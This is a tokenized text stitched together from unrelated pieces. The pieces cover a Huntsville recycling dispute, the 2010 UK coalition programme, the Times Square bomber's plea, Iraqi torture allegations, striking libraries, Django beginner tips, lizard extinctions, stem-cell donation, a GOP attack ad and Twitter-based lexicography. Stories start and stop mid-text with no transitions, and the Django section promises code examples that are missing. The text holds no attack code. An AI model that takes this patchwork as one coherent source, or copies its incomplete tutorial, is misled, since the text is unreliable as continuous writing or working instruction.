" But I guess a decision was made to use an alternative means of reuse . "
Holladay , the Solid Waste Disposal Authority director , said someone should have placed a sign outside the recyclery explaining what was being done with the glass .
" In retrospect , that maybe should have happened , " Holladay said Thursday .
" I do n't think anybody had any intentions of misleading people .
The hope was always that the ( glass ) market would come back . "
Rumors , phone calls
Billiter and others learned what was happening through a series of meetings with Allied , the solid waste authority and Covanta Energy , the company that operates the trash incinerator .
Billiter said she 'd heard rumors that glass taken to the recyclery ended up in the landfill .
" I just started making calls , " she said .
University of Alabama in Huntsville junior James Lovell also helped unravel the glass mystery .
The information systems major said he hopes it spurs the Rocket City to beef up recycling efforts .
Since March , about 500 people have signed Lovell 's petition asking that glass , cardboard , junk mail and more plastics be added to the curbside program .
Allied currently accepts only # 1 and # 2 plastics , which are the easiest to reuse .
Birmingham and Nashville , among others , recycle all types of plastic .
" We 're just trying to bring our recycling program up to speed , " Lovell said Thursday .
" It 's one of the most basic things we can do to have a sustainable city , before things like alternative energy and solar architecture .
" We just need to lower our garbage output . "
The municipal landfill on Johnson Road is permitted to accept up to 725 tons of trash daily ; about 600 tons more is burned in the incinerator .
The 50 - 55 tons being recycled here daily pales in comparison .
Some 94,000 households in Huntsville , Madison and parts of unincorporated Madison County have curbside recycling service , but Holladay estimates that only 1 in 3 are regular recyclers .
" We 've got to promote the program better , " he said .
" We 're looking at every aspect of the program , questioning if it is all it can be . "
Holladay said he is exploring whether Madison County 's used glass could be made into " glassphalt " - a material sometimes used in road paving .
Birmingham 's recycled glass is pulverized for use in concrete .
Lafarge , the world 's largest producer of building materials , buys about 60 tons each month from the Alabama Environmental Council 's Birmingham recycling center .
Even so , Michael Churchman , the environmental council 's director , said Alabama lags well behind most of the country when it comes to recycling .
Only about 8 percent of the state 's waste stream is reused , he said , while the U.S. average is about 35 percent .
" There 's clearly some opportunities , " Churchman said last week .
Billiter said she is encouraged by Allied 's promise to recycle glass through Strategic Materials but wants to see " some kind of public record " documenting the shipments to Atlanta .
Like UAH student Lovell , Billiter said her ultimate goal is a broader , more aggressive curbside recycling program in Huntsville .
She said the city would do well to copy Phoenix , which gives residents 96 - gallon containers large enough for all of their recyclables , including glass and cardboard .
" We believe more people will recycle if they trust the system , " Billiter said , " and are able to recycle more items .
" If we come together on this issue , we can make great strides quickly . "
In the circumstances it was probably just as well that David Cameron ended his speech launching the government 's detailed programme by making clear that he is , in fact , a Conservative and that Nick Clegg is , indeed , a Liberal Democrat .
So much else has been turned on its head in British politics over the past two weeks that it is a comfort of sorts to know that a few things still remain the same .
Do not rely on even this remaining true indefinitely , however .
Since 6
May there have already been plenty of days when one pinches oneself to be sure the whole process of coalition is for real – the talks , the handshakes , the garden press conference , the new cabinet , Cameron and Clegg side by side on the frontbench when the Commons reassembled on Tuesday .
In many respects , though , today topped the lot .
Cameron's and Clegg 's 36 - page programme for government is not for show .
In fact it 's certainly for real and it may be for keeps .
As the two men say in the introduction , theirs is a historic document .
British governments do not normally set out their five - year plans in this way with carefully written pledges under 31 separate detailed headings .
Such things are normal elsewhere in Europe , where coalitions are routine .
For Britain , by contrast , this is unprecedented governmental programme transparency , a step forward , real grownup , nitty - gritty stuff .
Danny Alexander and Oliver Letwin , who jointly did the heavy lifting , should take a bow .
The content matters most , of course .
Many of the key elements were known already – emergency budget , autumn spending review , tax priorities , Trident , Europe , political reform – and were set out in the earlier coalition agreement on 12 May .
Today ties that earlier document down .
Its most important sentence is almost certainly the one inside the back cover making clear – as George Osborne underscored – that the deficit reduction programme trumps everything else in the agreement .
Nevertheless there is also plenty that is new , including big topics largely unaddressed in the earlier agreement like crime and policing , business , equalities , and the health service .
If the 12 May document dealt head - on with the subjects that needed resolution before a coalition could be agreed , this week 's larger version fills out the gaps .
There are omissions nevertheless .
There is still barely a mention of the arts .
The fate of Ofcom and dozens of other agencies of varying importance is not revealed .
It is easy to be dismissive and a lot of people are .
There is a lot of continuity with the past – more than it suits either the coalition or its detractors from admitting .
Large tracts of the agreement are also aspirational rather than achievable .
More broadly , the idea that any government , especially one composed of such sometimes uneasy bedfellows , can ever truly command the political agenda is a vanity .
This government , like those before it , will be shaped at least as much by events as by its own programme .
An emerging critique today was that many difficult problems have been sublet to commissions and reviews .
My count is 33 such issues , ranging from the massive , like long - term care , public sector pensions and local government finance , to the more manageable , like extradition , non-doms or Scottish fossil fuel levies .
A lot of criminal justice issues have been parked in this way , like sentencing policy , criminal records and legal aid .
The assumption is that nothing will happen quickly on many of them .
But in grownup policymaking about difficult issues it often makes sense to step back and make progress gradually , especially after Labour 's compulsive legislative hyperactivity .
And with money in short supply , grand schemes will in any case have to wait .
These are still very early days .
For the coalition , necessity was at first the mother of invention .
Before 6
May , both partners gave some hypothetical thought as to how they might work together ( and with other parties ) .
All the real work , however , has been done in the past two weeks , since the logic of the parliamentary numbers became clearer .
Yet it is not too soon to insist that almost everything about this government so far , including today 's programme , is intended to be about more than making the best of a bad job .
Everything now points , indeed , to this coalition being a serious historic attempt to realign the liberal centre - right in the electoral middle ground .
Cameron and Clegg , in their own ways , now almost say as much .
" The more I see of this coalition in action , " Cameron said , " the more I see its potential , not just in solving the problems that lie before us but solving them with a shared set of values " .
Clegg went even further , seeming to claim that the coalition 's compromises and differing traditions – he now routinely talks about the " blend " between the Lib Dems and the Conservatives – have made its programme even stronger than they would have been apart .
Make no mistake about this .
Cameron and Clegg have suddenly become unexpected partners in a major political enterprise , not just to master the next five years of British politics but to reshape the party political map for a generation or more .
Clegg 's coalition decision last week was certainly a fateful call for the Liberal Democrats , but the palm for political audacity in May 2010 belongs above all to Cameron .
The Tory leader is exploiting every opportunity the political situation presents him to drag his party rapidly towards the liberal centre .
I believe in leading from the front , he said , and he is telling the truth .
The many policy concessions to the Lib Dems , especially those which cauterise the Tory right 's pet issues like Europe , the Human Rights
Act and inheritance tax only make sense in that light .
The right 's indignation is eloquent proof of what is happening .
The control grab over the backbench 1922 committee is the work of a politician who is set on marginalising the right , the mirror image of Tony Blair 's approach 15 years ago .
Will it succeed ?
Much depends on the impact of the budget and the spending review .
There may be coalition tears before bedtime .
But , if not , there is an intriguing alternative .
Four years down the line , if the economy is reviving and the liberal programme is secured , will the coalition partners run against each other in 2015 , or will they be tempted to run for the coalition 's re-election ?
An electoral pact to support one another under the alternative vote system would make a lot of sense .
If that happens , then the May 2010 political realignment could last for a decade and more .

The Times Square car bomber boasted to a judge that he is a Muslim soldier at war with the US .
When asked if he was sure he wanted to admit to the terror attack , US citizen Faisal Shahzad insisted he would " plead guilty and 100 times more " .
The married dad - of - two , 30 , told a Manhattan court that he chose the warm night of May 1 because the New York landmark would be crowded with people .
Replying to judge Miriam Goldman Cedarbaum 's questions over whether he feared killing children , Shahzad said : " I consider myself ... a Muslim soldier .
It 's a war .
I am part of the answer to the US terrorising the Muslim nations and the Muslim people .
On behalf of that , I 'm revenging the attack .
" Living in the United States , Americans only care about their people but they do n't care about people elsewhere in the world when they die . "
Shahzad told the court he armed his vehicle with three separate devices - a fertiliser - fuelled bomb packed in a gun cabinet , a set of propane tanks and gas canisters rigged with fireworks .
He added if America did not get out of Iraq and Afghanistan " we will be attacking the US " .
The terror attack was foiled when a street vendor alerted police .
Shahzad faces life in jail after admitting 10 terrorism and weapons charges including attempting to use a weapon of mass destruction .
He will be sentenced on October 5 .

The Iraqi authorities deny operating secret detention centres , but there have been past allegations of abuse .
In 2006 , the UN 's special rapporteur on torture said the situation was " out of control " and might be worse than under Saddam Hussein .
' Systematic '
More than 400 prisoners were said to have been held at the secret detention centre at an airbase in Baghdad .
Then they tortured us with electric shocks after pouring water over our bodies
Former detainee
One of the prisoners , a 68 - year - old man with dual British and Iraqi citizenship , said he had been harshly beaten , sodomised and had electric current passed through his genitals .
Human Rights
Watch said he and his fellow detainees were accused of aiding and abetting terrorism , though no - one was officially charged .
The BBC has spoken to a number of other men who were released from the same detention centre and they tell similar stories .
" The torture started when they put plastic bags over our heads .
Then they tortured us with electric shocks after pouring water over our bodies , " one man said .
The detention centre has now been closed .
Some of the detainees have been released , though the majority have been moved to a different prison .
The Iraqi government denies that it operates secret detention centres , or that abuse in its jails is endemic .
Human Rights
Watch , though , called the evidence " credible and consistent " , the torture " routine and systematic " .
The British embassy in Baghdad said it was aware of a British - Iraqi national being detained in Iraq and that consular officials had visited him in prison and were providing him with assistance .

One of Spot Cool Stuff ’s most popular travel posts has been our review of World ’s Best Bookstores .
But what about those people looking to borrow , and not buy , a book ?
Fortunately our planet also has several incredible libraries .
In fact , there ’s a case to be made for libraries having more interesting architecture than any other building type except for religious houses of worship .
Here ’s our look at eight architecturally amazing libraries ( and one that ’s not so much ) .
It is the first in a series of Spot Cool Stuff ’s tour of the world ’s best looking libraries .

Bibliothek des Rechtswissenschaftlichen Instituts
Zürich
Anyone familiar with the work of famed Spanish architect Santiago Calatrava will immediately see his hand in the elegant curves and dramatic interiors of the law library of the University of Zurich .
The desks and book stacks ringing the atrium here are a sight to behold , though we ’re not sure they are particularly conducive to getting work done — it is too tempting to people watch and to admire the architecture .
Those hoping to accomplish actual studying will be better off going to the more cozy and quiet areas away from the atrium .
Tourists visiting the library should take one of the glass elevators to the top floor to get the full feel for this fabulous building .
And those who ca n’t get to Zurich can make a virtual visit via the library ’s website ; the text on the site is in German only but includes a really well done visual virtual tour .

Biblioteca Parque España
Medellín , Colombia
Atop it hill in Medellin is what looks like three enormous rocks .
The first time you view this edifice from a distance you may well wonder whether it is the subject of some ancient deistic worship .
Then enter the Spain Library — stacks of books are in the outer rocks , an auditorium is in the middle — and the solid slab - like exterior melts away .
Slatted windows in the surprisingly thin exterior wall are positioned to let in maximum light .
And angled gaps in the walls create a light , airy feeling inside .
This juxtaposition between the open interior and solid granite exterior makes the Biblioteca Parque España our personal favorite library on this list .
These rocks are an architectural gem .

UCSD Geisel Library
San Diego , California
Do you see a resemblance between the Geisel Library and San Francisco ’s Transamerica Building ?
Both have pyramidal shapes ( albeit upside down in the case of the Geisel ) .
And both are the brainchild of architect William L. Pereira .
Pereira designed the Geisel Library in the late 1960s , at the end of a decade that saw a wave of supposedly futuristic architecture sweep southern California .
Spot Cool
Stuff is impressed at how modern this 40 - year old building still looks .
The Geisel Library is on the campus of the University of California at San Diego and is open to non-students .
To find it simply follow the snake path ( pic below ) .
Being located so close Hollywood , it is n’t surprising that the Geisel has been the location of several movie and television shoots , our favorite coming in the delightfully horrible Attack of the Killer Tomatoes .
The library was named after Theodore Geisel , who you may know better by his pen name : Dr. Seuss .

Seattle Public Library
Seattle , Washington USA
Eight horizontal sections , each with it ’s own function , makes up Seattle ’s cool main public library .
The major section is the “ Book Spiral , ” four floors high but traversed by slightly inclined floors such that one can walk from the bottom to the top without setting foot on a stair or elevator .
Other sections include an auditorium and a technology training center .
Between them are all sorts of public spaces .
The large carpeted “ Living Room ” area ( third and fourth pics , below ) is the most popular .
But we ’re partial to the nooks on the top floor and their views of Puget Sound .
Between the lounge chairs , computers , coffee stop and art displays please remember that you can also use this library to , you know , read books .
If you visit : Spot Cool Stuff highly suggests the free public library tours .
Not the general tour , which is focused more on how to use the library , but the hour - long architectural tour focused on the cool aspects of the building .
Phone reservations are not accepted but you can sign up for your spot on the next tour at the Welcome Desk on level 3 .

Biblioteca Sandro Penna
Perugia , Italy
A flying saucer landed 200 km north of Rome and then turned itself into a library .
Or at least that ’s how it may appear to visitors to Perugia , a town known more for its plethora of old churches that its modern - retro architecture .
The interior of the library resembles a cross between a dot - com office and the 13 year old girl ’s room — colorful couches and pastel book shelves mix with the pink - hued light produced by the glass walls .
We prefer visiting this library at night , looking at it from the outside , when the bright round shape of the library building looks other - worldly .

TU Delft Library
Delft , Netherlands
Any self - respecting technological institute should have a modern library .
Holland ’s Delft University of Technology is clearly full of self respect .
Their library does not only have 1,000 study spaces and 300 computer terminals but looks cool providing them .
The building ’s most visually striking feature is obvious from our photos — the 45 meter ( 150 ft ) high glass and steel cone protruding from the middle .
The edges of the cone work to bring light into the interior of the library ; inside the cone are four floors of reading rooms reached by a spiral staircase .
The true measure of this library ’s success , though , is perhaps best measured by the fact that it has become the hub of campus life .
Students shop in the bookstore and hang out in its coffee shop .
On warm , sunny days the library ’s gently - slopped grass - covered roof is full of people socializing and sun bathing .
If you visit : The TU Delft Library can be easily visited on a day trip from Amsterdam , 70 km ( 43 miles ) to the north .
To get their take bus 63 , 121 , 129 , or 201 from the Delft train station ; get off at the stop just before the auditorium on Michiel de Ruyterweg .

Look at it from the other side and the glassy sail - shapped structure looks pretty cool .
Then walk through the front door and you ’ll go WOW !
Entering the library puts you in the “ Urban Room , ” a massive atrium that extends five floors up to a series of skylights .
That design is part of the library ’s plan to make maximum use of natural light .
It works so well that on a sunny day there ’s almost no need to have lights on in the library .
Of course , on those days you ’ll likely want to be hanging out on the library ’s tree and flower - filled rooftop garden .

Library of Picture Books
Iwaki , Japan
What ’s cool about the Library of Picture Books in Iwaki ?
It ’s a library full of picture books !
It is also the work of one of Spot Cool Stuff ’s favorite architects , Tadao Ando , who ensured that from nearly every point in the library there was a view of the green hills of Fukushima and the Pacific Ocean a short distance beyond them .
Both the interior building and exterior grounds are full of kid-friendly play spaces and nooks for reading .
Much to the chagrin of parents , children are encouraged to ignore protocol and plop down with a book where ever they feel like , in the middle of the floor or on the stairs or where ever .

Stuff occasionally delights in travel sights that are so bad that they ’re good .
This abandon library in Russia strikes us as simply sad .
We ’ve never been to it ourselves ( and do n’t particularly want to go ) .
Knowledge of this library comes to us by way of the excellent photo blog English Russia .

The Creepiest Place on the Planet
Know a building we should include in our next installment of our cool library series of posts ?
Let us know in a comment :
Django is an incredibly - powerful web framework , but using it can be a bit daunting for new users .
I found this out the hard way over a year ago , spending hours struggling with even the most basic of concepts .
If you 're new to Django , ( or MVC frameworks in general ) , you 're probably going to have to shift your thinking a bit to use this robust framework .
Here are some of the issues that I had to struggle with before I fully understood them .
Hopefully , this will save you hours of struggling .
1. It 's Not a CMS
Django is n't a CMS .
It ca n't do everything that Wordpress or Drupal can do right out of the box .
That said , you can do infinitely more with Django , because it is n't a CMS .
If you have a background with , for example , a platform like WordPress , it 's going to take a while to wrap your head around the fact that you 're going to have to do a lot more things manually , such as creating urls or modifying settings .
Most of the configurations wo n't be done in a UI , but instead with Python files .
While Django does come with a pretty nifty admin area straight out of the box , configuring Django sometimes is n't as easy as a standard CMS .
2. Local Environment Setup
One of the biggest initial hurdles that new users face is configuring their local environment for Django .
For many beginners , it takes longer to install the framework locally than to build their first app .
PHP frameworks like CakePHP are pretty much ready to start using once you 've downloaded them on your local machine .
Installing Django and configuring it to run on the local machine can be kind of tricky , especially if you 're not familiar with concepts like symlinks .
The Django install docs are pretty comprehensive , but if those do n't work for you search for some video instruction or platform - specific documentation .
3. Projects vs. Apps
If you 're new to Django ( or MVC frameworks in general ) , odds are the terms " projects " and " apps " might be a little confusing .
With Django , a Project is just a collection of apps .
Say you were building a YouTube clone ; you would create a project , " MyTube " , that would contain apps like " videos " , " comments " , " ratings " , " blog " , etc .
Apps are similar to modules in a CMS , except you build them from scratch .
They 're a lot smaller in scope , typically performing only one main function .
For the MyTube example , you would n't just create one app that allowed users to upload videos , comment on them , rate them , and anything else .
You want your apps to be small in scope , performing only one or two functions by themselves .
4. Template Inheritance
Template inheritance is one of the best features of Django , but it usually takes a while to truly understand .
With a traditional CMS , you might split reusable parts of a template out into their own files ( like a header file ) , and include them in each of the templates .
With Django , you create a base .
html template , and you specify blocks that can be overwritten in child templates .
This keeps your code more reusable .
So , for an example , you might have a base .
html template that has this :
Then in another template you may choose to overwrite the { % content %} block .
Instead of having to include a sidebar file into the design , we just simply do something like this :
This extends the base . html .
This method allows you finer control over your templates , and ensures that you 're not creating duplicate code .
To learn more about the power of template inheritance , check out this article on the power of Django template inheritance .
5. Separation of Code and Media Files
Because Django does n't serve media files itself , it likes to separate the media files ( images , JavaScripts , stylesheets , etc. ) into a directory away from the apps .
This allows you to decide how you 're going to serve those static files .
You could use a separate webserver or cloud services like Amazon S3 to serve the files .
Your project files might look something like this :
6. Migrations
Database migrations are a trouble - spot for many beginners .
This happens when you already have fields in your database ( production or development ) , and you add something that modifies the database .
Other frameworks like Rails have database migrations built in .
With Django , however , unless you use a third - party solution , you have to do the migrations by hand .
Fortunately , there is an excellent third - party tool that handles Django migrations : South .
South allows you to perform database migrations , much like Rails allows , and is easy to roll into your existing project .
It 's powerful and simple , and takes care of the issue of database migrations that Django has .
Here 's a tutorial that has examples of how South works .
7. Local vs. Production Environments
Django comes with sqlite , a simple flat - file database that does n't need any configuration .
This makes prototyping fast and easy right out of the box .
However , once you 've moved your project into a production environment , odds are you 'll have to use a more robust database like Postgresql or MySQL .
This means that you 're going to have two separate environments : production and development .
Django does n't really have logic baked in that allows you to easily switch between two different settings without manually editing the settings .py file .
For example , having the setting
is helpful for local environments , because it provides helpful error messages when code goes bad .
But if you 're on a production environment , you 'll never want users to see your error messages , so you 'd need to specify -
.
There is a way to automatically toggle between the two environments , using this quick modification :
You can reuse the socket bit in different areas of your settings.py as well .
8. Writing Custom Template Tags
Template tags are an insanely useful aspect of Django .
In fact , it ships with many built - in template tags right out of the box .
However , if you 're wanting to write your own custom template tags , it can get a bit tricky .
Here 's a simple example of writing a custom template tag that should give you a better understanding of how template tags work and how to create your own .
9. Django User Authentication
Django comes with a great user authentication system in the project admin that you can use to manage users .
However , the user authentication system does n't provide a simple way to allow non-admins to create user accounts .
CMSs , like Drupal , handle this beautifully right out of the box .
There are a few great options for public user authentication systems that provide this missing functionality .
The most popular third - party solution is probably django - registration .
It 's simple yet flexible , and provides everything you need to get user signups in your application .
10 . Generic Views
Generic views are incredibly powerful , and can save you a lot of time writing views for your Django app .
However , most beginners do n't know how useful and powerful they are .
For example , if you want to create a flat page for your homepage , but want to style it differently , you can create a template in your flatpages template directory that utilizes the direct_to_template view .
Aside from creating the proper template , you 'll need to modify your urls .
py file to point to it :
Now , we have a homepage with a custom design that does n't require writing any custom views .
I 've utilized this technique many times instead of writing extra views .
Conclusion
Once you 've worked through all the tricky areas that catch most beginners , Django will prove to be a really fast and powerful tool for building web applications .
Do n't get discouraged if you find yourself confused early on .
You can always find help within the Django IRC channel ; Stackoverflow is another excellent place to ask questions .
They have been around since the time of the dinosaurs and have in the past survived several global mass extinctions of species , but now lizards are at serious risk of disappearing from the face of the earth as a result of climate change , scientists said yesterday .
An international study has found that as many as 20 per cent of the 3,800 species of lizards could be extinct by 2080 if global temperatures continue to rise as predicted .
In some parts of the world 12 per cent of the lizard populations that have been studied since 1995 have already disappeared – and researchers are blaming climate change .
Lizards , which include geckos , iguanas and chameleons , are often referred to as cold - blooded creatures but in fact their body temperature rises and falls with their exterior environment .
They have to bask in the sun to raise their body temperature , and seek shade when it gets too warm .
Scientists fear that , in many parts of the world , temperatures have become too warm for the local lizards to be able to stay out during the hottest part of the day to catch enough food , causing the animals to weaken and die .
" The results were clear .
These lizards need to bask in the sun to warm up , but it it gets too hot they have to retreat into the shade , and then they can't hunt for food , " said Professor Barry Sinervo of the University of California , Santa Cruz , who led the study published in the journal Science .
Other scientists have already documented an alarming loss of amphibian species – frogs , toads and newts – as a result of a complex interaction with a fungal infection and possibly climate change .
But the latest study , which involved constructing a computer model to predict future extinctions , clearly points to rising temperatures alone for the decline of lizards .
" We did a lot of work on the ground to validate the model and show that the extinctions are the result of climate change .
None of these are due to habitat loss .
These sites are not disturbed in any way , and most of them are in national parks or other protected areas , " Professor Sinervo said .
" Our research shows that the ongoing extinctions of lizards are directly due to climate warming from 1975 to the present ...
We thought we'd see evolution occurring in response to climate change , but instead we 're seeing extinctions , " he said .
" Beyond a certain point , the lizards can't adapt .
We 're predicting 40 per cent of local populations will go extinct and that will translate into roughly 20 per cent of species going extinct by 2080 , " Professor Sinervo added .
The scientists have studied some 48 species of spiny lizards at 200 sites in Mexico and found that between 1975 and 1995 some 12 per cent of the populations had gone extinct , even though their habitats had not changed noticeably .
A device that could mimic the increase in body temperature of blue spiny lizards basking in the sun indicated that local temperatures had risen too high for the animals to cope .
" At the extinct sites , we found the hours they could be out foraging had collapsed .
They would barely have been able to emerge to bask before having to retreat , " Professor Sinervo said .
Lizard facts
Lizards are a large and diverse group of reptiles , with nearly 3,800 known species .
They include geckos , chameleons and iguanas and are widely distributed around the world , but are concentrated in tropical and sub- tropical regions where high temperatures allow them to be active for long periods of time during the day all - year round .
Lizards play a critical role in the food chain , being an important food source for bigger animals such as snakes and birds , as well as controlling insect populations that might otherwise explode if left unchecked .
Overview
If you are planning to donate stem cells , you have agreed to allow doctors to draw bone marrow stem cells from either your blood or bone marrow for transplantation .
There are two broad types of stem cells : embryonic and bone marrow stem cells .
Embryonic stem cells are studied in therapeutic cloning and other types of research .
Bone marrow stem cells are formed and mature in the bone marrow and are then released into the bloodstream .
This type of stem cell is used in the treatment of cancers .
In the past , surgery to draw bone marrow stem cells directly from the bone was the only way to collect stem cells .
Today , however , it 's more common to collect stem cells from the blood .
This is called peripheral blood stem cell donation .
Stem cells can also be collected from umbilical cord blood at birth .
However , only a small amount of blood can be retrieved from the umbilical cord , so this type of transplant is generally reserved for children and small adults .
Why it 's done
Every year , thousands of people in the U.S. are diagnosed with life - threatening diseases , such as leukemia or lymphoma , for which a stem cell transplant is the best or the only treatment .
Donated blood stem cells are needed for these transplants .
You might be considering donating blood or bone marrow because someone in your family needs a stem cell transplant and doctors think you might be a match for that person .
Or perhaps you want to help someone else — maybe even someone you do n't know — who 's waiting for a stem cell transplant .
Risks
Bone marrow donation
Bone marrow stem cells are collected from the posterior section of the pelvic bone under general anesthesia .
The most serious risk associated with donating bone marrow involves the use and effects of anesthesia during surgery .
After the surgery , you might feel tired or weak and have trouble walking for a few days .
The area where the bone marrow was taken out might feel sore for a few days .
You can take a pain reliever for the discomfort .
You 'll likely be able to get back to your normal routine within a couple of days , but it may take a couple of weeks before you feel fully recovered .
Peripheral blood stem cell donation
The risks of this type of stem cell donation are minimal .
Before the donation , you 'll get injections of a medicine that increases the number of stem cells in your blood .
This medicine can cause side effects , such as bone pain , muscle aches , headache , fatigue , nausea and vomiting .
These usually disappear within a couple of days after you stop the injections .
You can take a pain reliever for the discomfort .
If that does n't help , your doctor can prescribe another pain medicine for you .
For the donation , you 'll have a thin , plastic tube ( catheter ) placed in a vein in your arm .
If the veins in your arms are too small or have thin walls , you may need to have a catheter put in a larger vein in your neck , chest or groin .
This rarely causes side effects , but complications that can occur include air trapped between your lungs and your chest wall ( pneumothorax ) , bleeding , and infection .
During the donation , you might feel lightheaded or have chills , numbness or tingling around your mouth , and cramping in your hands .
These will go away after the donation .
How you prepare
If you want to donate stem cells , you can talk to your doctor or contact the National Marrow Donor Program , a federally funded nonprofit organization that keeps a database of volunteers who are willing to donate .
If you decide to donate , the process and possible risks of donating will be explained to you .
You will then be asked to sign a consent form .
You can choose to sign or not .
You wo n't be pressured to sign the form .
After you agree to be a donor , you 'll have a test called human leukocyte antigen ( HLA ) typing .
HLAs are proteins found in most cells in your body .
This test helps match donors and recipients .
A close match increases the chances that the transplant will be a success .
If you sign up with a donor registry , you may or may not be matched with someone who needs a blood stem cell transplant .
However , if HLA typing shows that you 're a match , you 'll undergo additional tests to make sure you do n't have any genetic or infectious diseases that can be passed to the transplant recipient .
Your doctor will also ask about your health and your family history to make sure that donation will be safe for you .
A donor registry representative may ask you to make a financial contribution to cover the cost of screening and adding you to the registry , but this is usually voluntary .
Because cells from younger donors have the best chance of success when transplanted , anyone between the ages of 18 and 44 can join the registry for free .
People ages 45 to 60 are asked to pay a fee to join ; age 60 is the upper limit for donors .
If you 're identified as a match for someone who needs a transplant , the costs related to collecting stem cells for donation will be paid by that person or by his or her health insurance .
What you can expect
Bone marrow donation
Collecting stem cells from bone marrow is a type of surgery and is done in the operating room .
You 'll be given an anesthetic for the procedure .
Needles will be inserted through the skin and into the bone to draw the marrow out of the bone .
This process usually takes one to two hours .
After the bone marrow is collected , you 'll be taken to the recovery room while the anesthetic wears off .
You may then be taken to a hospital room where the nursing staff can monitor you .
When you 're fully alert and able to eat and drink , you 'll likely be released from the hospital .
Peripheral blood stem cell donation
If blood stem cells are going to be collected directly from your blood , you 'll be given injections of a medication to stimulate the production of blood stem cells so that more of them are circulating in your bloodstream .
The medication is usually started several days before you 're going to donate .
During the donation , blood is usually taken out through a catheter in a vein in your arm .
The blood is sent through a machine that takes out the stem cells .
The unused components are returned to your bloodstream .
This process is called apheresis .
It typically takes up to two hours and is done as an outpatient procedure .
You 'll typically undergo two to four apheresis sessions , depending on how many blood stem cells are needed .
After the procedure
Recovery times vary depending on the individual and type of donation .
But most blood stem cell donors are able to return to their usual activities within a few days to a week after donation .

GOP Attack Ad - Is This Man Masturbating ?
The web has no shortage of salacious videos — and a new one , compliments of the GOP , appears to depict a Democratic nominee for the Senate masturbating .

[ This is a guest post by David Bamman . ]
It took me a while to really make sense of Twitter .
For the longest time , it was ( to me ) the stomping ground of 14 - year - olds and Ashton Kutcher , each issuing a minute - by - minute feed of their lives .
Around the time Twitter arrived , however , I had just had a breakthrough on YouTube 's enormous popularity – it was only after watching a dozen different videos of the Super Mario Brothers theme song performed a dozen different ways that I finally got it : I may not care about cats playing the keyboard or wedding parties dancing down the aisle , but somebody does , and without a distribution system for people to broadcast whatever their hearts felt like , I never would have had my life improved by that kid with the beatboxing flute or the one with the double guitar .
So I waited for a similar breakthrough with Twitter .
It came , at long last , after I realized that it was exactly what I first thought it was : 14 - year - olds ( and Ashton Kutcher ) chronicling the minutiae of their lives .
It is colloquial language , constrained by 140 characters : everyday conversations about waiting in line at the grocery store , your flight just landing at ORD , what to do this Saturday night , " omg did u see hr dress ? "
In spurts it is , of course , much more than that , as its use during the protests of the 2009 Iranian election proved , but in its unmarked use , it 's the language of how millions of people across the world talk to their friends .
To say Twitter is colloquial is putting it lightly .
" Brother , " for example , occurs in Twitter data during the week of May 10 - 17 , 2010 with an average frequency of once every 7,338 words , not too distant from its frequency in its closest cousin , the Corpus of Contemporary American English ( once every 9,405 words ) .
The difference for " bro , " however , is much more dramatic : in the Twitter data during that same period , it occurs once every 5,833 words ( more frequently , in fact , than " brother " ) , while in the COCA it occurs once every 757,575 words – two orders of magnitude less frequently .
In April 2010 , Twitter had approximately 106M registered users .
The volume of data that flows through the Twitter pipe dwarfs any other publicly available linguistic corpus in existence ( except the web itself ) , and unlike fixed corpora , it still flows .
Such a huge dataset has proven itself to be a fertile resource for a number of natural language processing tasks ( such as trend detection and sentiment analysis ) , but its value as a collection of colloquial language begs to be used for lexicography as well : if the purpose of a dictionary is to record actual usage , then Twitter data allows us to broaden the scope of our corpus beyond newswire , literary works and other forms of privileged publication and include the unedited language of everyday folks as well .
Inducing language demographics
In addition to letting us capture the colloquial language of over one hundred million people , Twitter also provides us with a rich data source for inducing the demographics of that language community .
The data that Twitter releases as part of its public datastream includes a number of features for each " tweet . "
In addition to the content of the message itself , each tweet is accompanied by the creator 's username , display information such as the URL of the profile picture and background color , follower count , and a wealth of other metadata , including a timestamp for its creation and user - defined geographical information – for me ( @dbamman ) , this is " Boston , MA " but a user can write anything ( " New York , " " NYC , " " in the intertubes " ) or choose to have their location tagged with precise latitude and longitude coordinates ( though only a small fraction actually do so ) .
The datasource is ostensibly so rich in order to enable third - party development ( e.g. , location - enabled iPhone apps ) , but all of this information contains valuable demographic indicators for plotting language use across time , space and different populations .
Geography
The geographic information embedded in each tweet allows us to map language use across the US and , like the Dictionary of American Regional English , report on the nuances of language that are characteristic of certain communities .
The user - defined geographic information is noisy data : while " Boston , MA " can be automatically disambiguated relatively easily to a physical location on the earth ( corresponding to coordinates 42.35843 , -71.05977 ) , others ( " Springfield " ) are more difficult ( there are many Springfields ) ; others still are nearly impossible ( " home of that boy Biggie , " a reference to New York City quoted from Jay - Z's " Empire State of Mind " ) , and some ( " in ur fridge eatin ur foodz " ) do n't map to any space in physical reality .
The sheer volume of data , however , gives us the flexibility to focus more on precision than on overall accuracy – we can throw away all tweets where we are n't over 99 % sure of the physical location .
With this disambiguated data , we can map the usage of words and phrases across the US by normalizing each word 's count by the volume of total data coming out of each state ( to avoid biasing the statistics toward populous states such as New York and California ) .
Comparing these resulting ratios allows us to get a demographic picture of word use across the US .
Here " grand canyon " is visualized on a map using the Google Charts API ( lighter blue represents more characteristic usage ) .
Figure 1 : Demographics of " grand canyon "
A sanity check reveals that , yes , it is in Boston that the Red Sox are most characteristically talked about ( this is different from " most talked about " which , again , could even be a state like New York given its large population ) .
Californians talk characteristically of earthquakes and Wisconsin of the Green Bay Packers ( even in May ) .
This same method that works for detecting prevalent topics in certain areas also allows us to detect regionalisms in slang as well .
The southern US is the focal point for words like " bruh " and " ima " ( and its orthographic variants i'ma and imma ) , while " hella " is centered in California and " rad " in the Pacific Northwest .
" Wicked " is more characteristic of New England ( especially Massachusetts ) , but less strongly than the others ( perhaps because of its polysemy – its meaning as " very " is likely a regionalism but its older sense of " evil " is almost certainly not ) .
This gets to one limitation of this method : statistics are all computed on a token level ( the word form ) , not at the level of individual senses , so the clear regional distinction between " pop " and " soda " that we would love to see gets blurred , since " pop " is used throughout the US not simply as a synonym of " soda " but in other senses as well ( " pop music , " " pop out , " etc. ) .
Figure 2 : Demographics of " bruh "
Age and gender
While Twitter does n't explicitly ask for or subsequently publish any age or gender data for its users , we can approximate both on a large scale using common demographic indicators such as the user 's first name .
While some names like " David " have relatively even distributions across birth years ( which we can compute using information from the US Social Security Department ) , other names are heavily biased toward certain generations .
" Jasmyn , " for instance , is far more likely to be the name of a teenager now than someone named " Pearl " ; if your name is " Arsenio " and you were born in the US , it 's over 99 % likely that you 're a male born between the years of 1989 - 1991 .
With this statistical information , we can compute a probability distribution for the entire age range between 12 and 75 and increment the weight count of each word according to this distribution .
